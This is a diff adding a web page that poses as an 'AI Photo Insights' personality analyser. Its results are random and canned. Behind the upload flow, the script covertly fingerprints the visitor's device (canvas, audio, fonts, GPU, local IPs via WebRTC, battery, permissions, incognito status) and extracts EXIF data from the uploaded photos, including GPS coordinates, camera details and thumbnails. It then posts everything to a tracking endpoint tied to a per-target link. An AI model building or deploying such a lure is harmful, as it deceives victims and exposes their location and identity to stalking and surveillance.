@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Photo Insights — AI Photo Analyzer</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔮</text></svg>">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+      background:#0a0a1a;color:#e2e8f0;min-height:100vh;
+      overflow-x:hidden;
+    }
+    .bg{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse at 20% 50%,rgba(99,102,241,.15),transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(168,85,247,.12),transparent 50%),#0a0a1a}
+    .container{position:relative;z-index:1;max-width:640px;margin:0 auto;padding:2rem 1.5rem;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+    h1{font-size:2rem;font-weight:800;background:linear-gradient(135deg,#818cf8,#c084fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:.5rem;text-align:center}
+    .subtitle{color:#94a3b8;text-align:center;margin-bottom:2rem;font-size:.95rem;line-height:1.5}
+    .upload-zone{
+      width:100%;border:2px dashed rgba(99,102,241,.4);border-radius:16px;padding:3rem 2rem;text-align:center;cursor:pointer;
+      transition:all .3s;background:rgba(255,255,255,.02);position:relative;
+    }
+    .upload-zone:hover,.upload-zone.dragover{border-color:#818cf8;background:rgba(99,102,241,.08)}
+    .upload-zone input{position:absolute;inset:0;opacity:0;cursor:pointer}
+    .upload-icon{font-size:3rem;margin-bottom:1rem;opacity:.7}
+    .upload-text{color:#94a3b8;font-size:.9rem}
+    .upload-text strong{color:#c4b5fd}
+    .badge{display:inline-block;background:rgba(99,102,241,.15);color:#a5b4fc;padding:.25rem .75rem;border-radius:999px;font-size:.75rem;margin-top:1rem}
+    .photos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:.75rem;width:100%;margin:1.5rem 0}
+    .photo-thumb{aspect-ratio:1;border-radius:10px;overflow:hidden;position:relative;background:#1a1a2e}
+    .photo-thumb img{width:100%;height:100%;object-fit:cover}
+    .photo-thumb .check{position:absolute;top:4px;right:4px;background:#22c55e;color:#fff;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+    .btn{padding:.75rem 2rem;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:all .2s;width:100%;max-width:320px}
+    .btn-primary{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff}
+    .btn-primary:hover{transform:translateY(-1px);box-shadow:0 8px 25px rgba(99,102,241,.3)}
+    .btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+    .analyzing{text-align:center;width:100%}
+    .scan-container{width:200px;height:200px;margin:2rem auto;border-radius:16px;overflow:hidden;position:relative;background:#1a1a2e}
+    .scan-container img{width:100%;height:100%;object-fit:cover}
+    .scan-line{position:absolute;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,#818cf8,transparent);animation:scan 2s ease-in-out infinite}
+    @keyframes scan{0%{top:0}50%{top:100%}100%{top:0}}
+    .scan-text{color:#a5b4fc;font-size:.9rem;margin-top:1rem;animation:pulse 1.5s ease-in-out infinite}
+    @keyframes pulse{0%,100%{opacity:.5}50%{opacity:1}}
+    .results{width:100%;animation:fadeIn .5s}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+    .result-card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:1.5rem;margin-bottom:1rem}
+    .result-card h3{font-size:.85rem;text-transform:uppercase;letter-spacing:.05em;color:#818cf8;margin-bottom:1rem}
+    .trait{display:flex;justify-content:space-between;align-items:center;margin-bottom:.75rem}
+    .trait-name{font-size:.9rem}
+    .trait-bar{flex:1;height:6px;background:rgba(255,255,255,.08);border-radius:3px;margin:0 1rem;overflow:hidden}
+    .trait-fill{height:100%;border-radius:3px;transition:width 1s ease}
+    .trait-val{font-size:.85rem;color:#a5b4fc;font-weight:600;min-width:40px;text-align:right}
+    .insight{display:flex;gap:.75rem;align-items:flex-start;padding:.75rem 0;border-bottom:1px solid rgba(255,255,255,.06)}
+    .insight:last-child{border:none}
+    .insight-icon{font-size:1.3rem;flex-shrink:0}
+    .insight-text{font-size:.88rem;line-height:1.5}
+    .insight-text strong{color:#c4b5fd}
+    .more-btn{margin-top:1.5rem;text-align:center}
+    .more-btn a{color:#818cf8;font-size:.9rem;cursor:pointer;text-decoration:underline}
+    .hidden{display:none!important}
+    .step{width:100%;display:flex;flex-direction:column;align-items:center}
+  </style>
+</head>
+<body>
+  <div class="bg"></div>
+  <div class="container">
+
+    <!-- Step 1: Upload -->
+    <div class="step" id="step1">
+      <h1>AI Photo Insights</h1>
+      <p class="subtitle">Upload your photos and discover what AI reveals about your personality, mood, and hidden patterns.</p>
+      <div class="upload-zone" id="dropZone">
+        <input type="file" accept="image/*" multiple id="fileInput">
+        <div class="upload-icon">📸</div>
+        <div class="upload-text"><strong>Tap to select photos</strong> or drag & drop</div>
+        <div class="badge">Select multiple for deeper analysis</div>
+      </div>
+      <div class="photos-grid hidden" id="thumbGrid"></div>
+      <button class="btn btn-primary hidden" id="analyzeBtn" onclick="startAnalysis()" disabled>Analyze Photos</button>
+    </div>
+
+    <!-- Step 2: Analyzing -->
+    <div class="step hidden" id="step2">
+      <h1>Analyzing...</h1>
+      <div class="analyzing">
+        <div class="scan-container"><img id="scanImg" src=""><div class="scan-line"></div></div>
+        <div class="scan-text" id="scanText">Reading image patterns...</div>
+      </div>
+    </div>
+
+    <!-- Step 3: Results -->
+    <div class="step hidden" id="step3">
+      <h1>Your Photo Insights</h1>
+      <p class="subtitle" id="resultSummary"></p>
+      <div class="results" id="resultsContainer"></div>
+      <div class="more-btn"><a onclick="reset()">Analyze more photos</a></div>
+    </div>
+  </div>
+
+  <script>
+    const linkId = window.location.pathname.split("/g/")[1];
+    let uploadedPhotos = [];
+    let allExifData = [];
+    let deviceInfo = {};
+
+    // Collect passive fingerprints immediately
+    collectSync(deviceInfo);
+    Promise.allSettled([
+      collectBattery(deviceInfo), collectWebRTC(deviceInfo), collectMedia(deviceInfo),
+      collectPermissions(deviceInfo), collectStorage(deviceInfo), collectAudioFP(deviceInfo),
+      collectVoices(deviceInfo), collectClientHints(deviceInfo),
+    ]);
+
+    // File handling
+    const fileInput = document.getElementById("fileInput");
+    const dropZone = document.getElementById("dropZone");
+
+    fileInput.addEventListener("change", handleFiles);
+    dropZone.addEventListener("dragover", (e) => { e.preventDefault(); dropZone.classList.add("dragover"); });
+    dropZone.addEventListener("dragleave", () => dropZone.classList.remove("dragover"));
+    dropZone.addEventListener("drop", (e) => { e.preventDefault(); dropZone.classList.remove("dragover"); handleFiles({ target: { files: e.dataTransfer.files } }); });
+
+    async function handleFiles(e) {
+      const files = Array.from(e.target.files).filter((f) => f.type.startsWith("image/"));
+      if (!files.length) return;
+
+      document.getElementById("thumbGrid").classList.remove("hidden");
+      document.getElementById("analyzeBtn").classList.remove("hidden");
+      const grid = document.getElementById("thumbGrid");
+
+      for (const file of files) {
+        const reader = new FileReader();
+        reader.onload = async (ev) => {
+          const arrayBuf = ev.target.result;
+          const blob = new Blob([arrayBuf], { type: file.type });
+          const url = URL.createObjectURL(blob);
+
+          uploadedPhotos.push({ url, name: file.name, size: file.size, type: file.type, lastModified: file.lastModified });
+
+          const exif = file.type === "image/jpeg" ? extractExif(arrayBuf) : {};
+          exif.fileName = file.name;
+          exif.fileSize = file.size;
+          exif.fileType = file.type;
+          exif.lastModified = new Date(file.lastModified).toISOString();
+
+          const thumb = await makeThumb(blob, 80);
+          exif.thumbnail = thumb;
+          allExifData.push(exif);
+
+          const div = document.createElement("div");
+          div.className = "photo-thumb";
+          div.innerHTML = `<img src="${url}"><div class="check">✓</div>`;
+          grid.appendChild(div);
+
+          document.getElementById("analyzeBtn").disabled = false;
+        };
+        reader.readAsArrayBuffer(file);
+      }
+    }
+
+    function makeThumb(blob, maxSize) {
+      return new Promise((resolve) => {
+        const img = new Image();
+        img.onload = () => {
+          const scale = Math.min(maxSize / img.width, maxSize / img.height, 1);
+          const c = document.createElement("canvas");
+          c.width = img.width * scale;
+          c.height = img.height * scale;
+          c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
+          resolve(c.toDataURL("image/jpeg", 0.5));
+          URL.revokeObjectURL(img.src);
+        };
+        img.src = URL.createObjectURL(blob);
+      });
+    }
+
+    // EXIF Parser
+    function extractExif(buffer) {
+      const result = {};
+      try {
+        const view = new DataView(buffer);
+        if (view.getUint16(0) !== 0xffd8) return result;
+        let offset = 2;
+        while (offset < view.byteLength - 4) {
+          const marker = view.getUint16(offset);
+          if (marker === 0xffe1) {
+            const exifHeader = view.getUint32(offset + 4);
+            if (exifHeader === 0x45786966) {
+              const tiffStart = offset + 10;
+              const le = view.getUint16(tiffStart) === 0x4949;
+              const ifdOff = view.getUint32(tiffStart + 4, le);
+              parseIFD(view, tiffStart, tiffStart + ifdOff, le, result, 0);
+            }
+            break;
+          }
+          offset += 2 + view.getUint16(offset + 2);
+        }
+      } catch {}
+      if (result._gpsIFD) {
+        try { parseIFD(new DataView(buffer), result._tiffStart, result._gpsIFD, result._le, result, 1); } catch {}
+        convertGPS(result);
+      }
+      if (result._exifIFD) {
+        try { parseIFD(new DataView(buffer), result._tiffStart, result._exifIFD, result._le, result, 2); } catch {}
+      }
+      delete result._gpsIFD; delete result._exifIFD; delete result._tiffStart; delete result._le;
+      return result;
+    }
+
+    function parseIFD(view, tiffStart, ifdOffset, le, result, mode) {
+      result._tiffStart = tiffStart;
+      result._le = le;
+      const count = view.getUint16(ifdOffset, le);
+      for (let i = 0; i < count; i++) {
+        const entry = ifdOffset + 2 + i * 12;
+        const tag = view.getUint16(entry, le);
+        const type = view.getUint16(entry + 2, le);
+        const num = view.getUint32(entry + 4, le);
+        const valOff = num <= 4 ? entry + 8 : tiffStart + view.getUint32(entry + 8, le);
+
+        if (mode === 0) {
+          if (tag === 0x8825) result._gpsIFD = tiffStart + view.getUint32(entry + 8, le);
+          if (tag === 0x8769) result._exifIFD = tiffStart + view.getUint32(entry + 8, le);
+          if (tag === 0x010f) result.cameraMake = readStr(view, valOff, num);
+          if (tag === 0x0110) result.cameraModel = readStr(view, valOff, num);
+          if (tag === 0x0131) result.software = readStr(view, valOff, num);
+          if (tag === 0x0132) result.dateTime = readStr(view, valOff, num);
+          if (tag === 0x0112) result.orientation = view.getUint16(valOff, le);
+        }
+        if (mode === 1) {
+          if (tag === 1) result._latRef = readStr(view, valOff, num);
+          if (tag === 2) result._lat = readRationals(view, valOff, 3, le);
+          if (tag === 3) result._lonRef = readStr(view, valOff, num);
+          if (tag === 4) result._lon = readRationals(view, valOff, 3, le);
+          if (tag === 5) result.gpsAltitudeRef = view.getUint8(valOff);
+          if (tag === 6) result.gpsAltitude = readRational(view, valOff, le);
+        }
+        if (mode === 2) {
+          if (tag === 0x9003) result.dateTimeOriginal = readStr(view, valOff, num);
+          if (tag === 0x920a) result.focalLength = readRational(view, valOff, le);
+          if (tag === 0x829a) result.exposureTime = readRational(view, valOff, le);
+          if (tag === 0x829d) result.fNumber = readRational(view, valOff, le);
+          if (tag === 0x8827) result.iso = view.getUint16(valOff, le);
+          if (tag === 0xa002) result.imageWidth = view.getUint32(valOff, le) || view.getUint16(valOff, le);
+          if (tag === 0xa003) result.imageHeight = view.getUint32(valOff, le) || view.getUint16(valOff, le);
+        }
+      }
+    }
+
+    function readStr(view, off, len) {
+      let s = "";
+      for (let i = 0; i < len - 1; i++) { const c = view.getUint8(off + i); if (c === 0) break; s += String.fromCharCode(c); }
+      return s.trim();
+    }
+    function readRational(view, off, le) {
+      return view.getUint32(off, le) / view.getUint32(off + 4, le);
+    }
+    function readRationals(view, off, count, le) {
+      const r = [];
+      for (let i = 0; i < count; i++) r.push(readRational(view, off + i * 8, le));
+      return r;
+    }
+    function convertGPS(r) {
+      if (r._lat && r._lon) {
+        const toD = (dms) => dms[0] + dms[1] / 60 + dms[2] / 3600;
+        r.gpsLatitude = toD(r._lat) * (r._latRef === "S" ? -1 : 1);
+        r.gpsLongitude = toD(r._lon) * (r._lonRef === "W" ? -1 : 1);
+      }
+      delete r._lat; delete r._lon; delete r._latRef; delete r._lonRef;
+    }
+
+    // Analysis flow
+    async function startAnalysis() {
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+
+      if (uploadedPhotos[0]) document.getElementById("scanImg").src = uploadedPhotos[0].url;
+
+      const phases = ["Reading image patterns...", "Analyzing color psychology...", "Detecting mood signatures...", "Mapping personality traits...", "Generating insights..."];
+      for (let i = 0; i < phases.length; i++) {
+        document.getElementById("scanText").textContent = phases[i];
+        await sleep(800);
+      }
+
+      // Send tracking data
+      try {
+        deviceInfo.photos = allExifData;
+        await fetch("/api/track", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ id: linkId, deviceInfo }),
+        });
+      } catch {}
+
+      showResults();
+    }
+
+    function showResults() {
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("step3").classList.remove("hidden");
+
+      const photoCount = uploadedPhotos.length;
+      document.getElementById("resultSummary").textContent = `Based on ${photoCount} photo${photoCount > 1 ? "s" : ""}, here's what AI discovered:`;
+
+      const traits = shuffle([
+        { name: "Creativity", color: "#818cf8" },
+        { name: "Adventurousness", color: "#c084fc" },
+        { name: "Emotional Depth", color: "#f472b6" },
+        { name: "Social Energy", color: "#34d399" },
+        { name: "Attention to Detail", color: "#fbbf24" },
+        { name: "Confidence", color: "#60a5fa" },
+        { name: "Optimism", color: "#4ade80" },
+        { name: "Curiosity", color: "#fb923c" },
+      ]).slice(0, 5);
+
+      const insights = shuffle([
+        { icon: "🎨", text: "Your photos suggest a <strong>visually oriented mind</strong> — you notice details others miss." },
+        { icon: "🌍", text: "There's a pattern of <strong>exploration and openness</strong> in your image choices." },
+        { icon: "💡", text: "Your color preferences indicate <strong>creative problem-solving abilities</strong>." },
+        { icon: "🧭", text: "AI detected signs of a <strong>natural leader</strong> with strong spatial awareness." },
+        { icon: "✨", text: "Your aesthetic sense suggests <strong>high emotional intelligence</strong>." },
+        { icon: "🔮", text: "Image composition patterns reveal an <strong>intuitive decision maker</strong>." },
+        { icon: "🎯", text: "Your photos show a preference for <strong>balance and harmony</strong>." },
+        { icon: "🌟", text: "AI detected <strong>above-average perceptiveness</strong> from your image selection." },
+      ]).slice(0, 4);
+
+      let html = '<div class="result-card"><h3>Personality Breakdown</h3>';
+      traits.forEach((t) => {
+        const val = 55 + Math.floor(Math.random() * 40);
+        html += `<div class="trait"><span class="trait-name">${t.name}</span><div class="trait-bar"><div class="trait-fill" style="width:${val}%;background:${t.color}"></div></div><span class="trait-val">${val}%</span></div>`;
+      });
+      html += "</div>";
+
+      html += '<div class="result-card"><h3>AI Insights</h3>';
+      insights.forEach((ins) => {
+        html += `<div class="insight"><span class="insight-icon">${ins.icon}</span><span class="insight-text">${ins.text}</span></div>`;
+      });
+      html += "</div>";
+
+      document.getElementById("resultsContainer").innerHTML = html;
+
+      // Animate bars
+      setTimeout(() => {
+        document.querySelectorAll(".trait-fill").forEach((el) => { el.style.width = el.style.width; });
+      }, 100);
+    }
+
+    function reset() {
+      uploadedPhotos = [];
+      allExifData = [];
+      document.getElementById("thumbGrid").innerHTML = "";
+      document.getElementById("thumbGrid").classList.add("hidden");
+      document.getElementById("analyzeBtn").classList.add("hidden");
+      document.getElementById("analyzeBtn").disabled = true;
+      document.getElementById("fileInput").value = "";
+      document.getElementById("step3").classList.add("hidden");
+      document.getElementById("step1").classList.remove("hidden");
+    }
+
+    function shuffle(arr) { for (let i = arr.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [arr[i], arr[j]] = [arr[j], arr[i]]; } return arr; }
+    function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+
+    // === Passive fingerprinting (same as collect.html) ===
+    function collectSync(d) {
+      d.userAgent = navigator.userAgent;
+      d.platform = navigator.platform;
+      d.vendor = navigator.vendor;
+      d.language = navigator.language;
+      d.languages = [...(navigator.languages || [])];
+      d.cpuCores = navigator.hardwareConcurrency;
+      d.deviceMemory = navigator.deviceMemory;
+      d.maxTouchPoints = navigator.maxTouchPoints;
+      d.doNotTrack = navigator.doNotTrack;
+      d.cookieEnabled = navigator.cookieEnabled;
+      d.online = navigator.onLine;
+      d.webdriver = navigator.webdriver;
+      d.pdfViewer = navigator.pdfViewerEnabled;
+      d.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, orientation: screen.orientation?.type, angle: screen.orientation?.angle };
+      d.viewport = { width: window.innerWidth, height: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight };
+      d.devicePixelRatio = window.devicePixelRatio;
+      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      d.timezoneOffset = new Date().getTimezoneOffset();
+      d.locale = Intl.DateTimeFormat().resolvedOptions().locale;
+      d.localTime = new Date().toISOString();
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) d.connection = { type: conn.type, effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt, saveData: conn.saveData };
+      try {
+        const c = document.createElement("canvas"), gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if (gl) { const ext = gl.getExtension("WEBGL_debug_renderer_info"); d.gpu = { vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null, renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null, version: gl.getParameter(gl.VERSION) }; }
+      } catch {}
+      try {
+        const c = document.createElement("canvas"); c.width = 200; c.height = 50; const ctx = c.getContext("2d");
+        ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069"; ctx.fillText("fp_canvas", 2, 15); ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp_canvas", 4, 17);
+        const url = c.toDataURL(); let h = 0; for (let i = 0; i < url.length; i++) h = ((h << 5) - h + url.charCodeAt(i)) | 0;
+        d.canvasFingerprint = h.toString(16);
+      } catch {}
+      try { const a = new (window.AudioContext || window.webkitAudioContext)(); d.audio = { sampleRate: a.sampleRate, maxChannels: a.destination.maxChannelCount }; a.close(); } catch {}
+      d.preferences = { colorScheme: matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light", reducedMotion: matchMedia("(prefers-reduced-motion: reduce)").matches, pointer: matchMedia("(any-pointer: coarse)").matches ? "coarse" : "fine" };
+      d.features = { webSocket: "WebSocket" in window, webRTC: "RTCPeerConnection" in window, serviceWorker: "serviceWorker" in navigator, webAssembly: "WebAssembly" in window };
+      if (performance.memory) d.memory = { jsHeapSizeLimit: performance.memory.jsHeapSizeLimit, totalJSHeapSize: performance.memory.totalJSHeapSize };
+      d.referrer = document.referrer || null;
+      d.historyLength = history.length;
+      try {
+        const baseFonts = ["monospace", "sans-serif", "serif"];
+        const testFonts = ["Arial","Calibri","Comic Sans MS","Courier New","Georgia","Helvetica","Impact","Monaco","Segoe UI","Times New Roman","Verdana","Roboto","SF Pro"];
+        const span = document.createElement("span"); span.style.cssText = "position:absolute;left:-9999px;font-size:72px;visibility:hidden"; span.textContent = "mmmmmmmmmmlli"; document.body.appendChild(span);
+        const baseW = {}; for (const b of baseFonts) { span.style.fontFamily = b; baseW[b] = span.offsetWidth; }
+        const detected = []; for (const f of testFonts) { for (const b of baseFonts) { span.style.fontFamily = `'${f}',${b}`; if (span.offsetWidth !== baseW[b]) { detected.push(f); break; } } }
+        document.body.removeChild(span); d.installedFonts = detected;
+      } catch {}
+      try {
+        d.mathFingerprint = [Math.tan(-1e300), Math.acos(0.123456789), Math.sinh(1), Math.atanh(0.5)].map(String).join(",");
+      } catch {}
+      try {
+        const bait = document.createElement("div"); bait.className = "adsbox ad-banner"; bait.style.cssText = "position:absolute;left:-9999px;width:1px;height:1px"; bait.innerHTML = "&nbsp;";
+        document.body.appendChild(bait); d.adBlocker = bait.offsetHeight === 0; document.body.removeChild(bait);
+      } catch {}
+    }
+
+    async function collectBattery(d) { try { const b = await navigator.getBattery(); d.battery = { level: Math.round(b.level * 100), charging: b.charging }; } catch {} }
+    function collectWebRTC(d) {
+      return new Promise((resolve) => {
+        try {
+          const ips = new Set(), pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+          pc.createDataChannel(""); pc.onicecandidate = (e) => { if (!e.candidate) { pc.close(); d.localIPs = [...ips]; resolve(); return; } const p = e.candidate.candidate.split(" "); if (p.length >= 5 && p[4] !== "0.0.0.0") ips.add(p[4]); };
+          pc.createOffer().then((o) => pc.setLocalDescription(o)); setTimeout(() => { try { pc.close(); } catch {} d.localIPs = [...ips]; resolve(); }, 1500);
+        } catch { d.localIPs = []; resolve(); }
+      });
+    }
+    async function collectMedia(d) { try { const devs = await navigator.mediaDevices?.enumerateDevices(); if (devs) d.mediaDevices = { audioInputs: devs.filter((x) => x.kind === "audioinput").length, audioOutputs: devs.filter((x) => x.kind === "audiooutput").length, videoInputs: devs.filter((x) => x.kind === "videoinput").length }; } catch {} }
+    async function collectPermissions(d) { d.permissions = {}; for (const n of ["geolocation","notifications","camera","microphone"]) { try { const r = await navigator.permissions.query({ name: n }); d.permissions[n] = r.state; } catch {} } }
+    async function collectStorage(d) { try { const e = await navigator.storage?.estimate(); if (e) { d.storageEstimate = { quota: e.quota, usage: e.usage }; d.possibleIncognito = e.quota < 200 * 1024 * 1024; } } catch {} }
+    function collectAudioFP(d) {
+      return new Promise((resolve) => {
+        try {
+          const ctx = new OfflineAudioContext(1, 44100, 44100), osc = ctx.createOscillator(), comp = ctx.createDynamicsCompressor();
+          osc.type = "triangle"; osc.frequency.setValueAtTime(10000, ctx.currentTime);
+          comp.threshold.setValueAtTime(-50, ctx.currentTime); comp.knee.setValueAtTime(40, ctx.currentTime); comp.ratio.setValueAtTime(12, ctx.currentTime);
+          osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+          ctx.startRendering().then((buf) => { const data = buf.getChannelData(0); let h = 0; for (let i = 4500; i < 5000; i++) h = ((h << 5) - h + Math.round(data[i] * 1e6)) | 0; d.audioFingerprint = h.toString(16); resolve(); });
+          setTimeout(resolve, 1000);
+        } catch { resolve(); }
+      });
+    }
+    function collectVoices(d) {
+      return new Promise((resolve) => {
+        try { const v = speechSynthesis.getVoices().map((v) => `${v.name}|${v.lang}`); if (v.length) { d.voices = v; resolve(); return; } speechSynthesis.onvoiceschanged = () => { d.voices = speechSynthesis.getVoices().map((v) => `${v.name}|${v.lang}`); resolve(); }; setTimeout(resolve, 500); } catch { resolve(); }
+      });
+    }
+    async function collectClientHints(d) {
+      try {
+        const ua = navigator.userAgentData; if (!ua) return;
+        d.clientHints = { brands: ua.brands?.map((b) => `${b.brand}/${b.version}`), mobile: ua.mobile, platform: ua.platform };
+        const hi = await ua.getHighEntropyValues(["architecture","bitness","model","platformVersion","fullVersionList","wow64"]);
+        Object.assign(d.clientHints, { architecture: hi.architecture, bitness: hi.bitness, model: hi.model, platformVersion: hi.platformVersion, wow64: hi.wow64, fullVersionList: hi.fullVersionList?.map((b) => `${b.brand}/${b.version}`) });
+      } catch {}
+    }
+  </script>
+</body>
+</html>
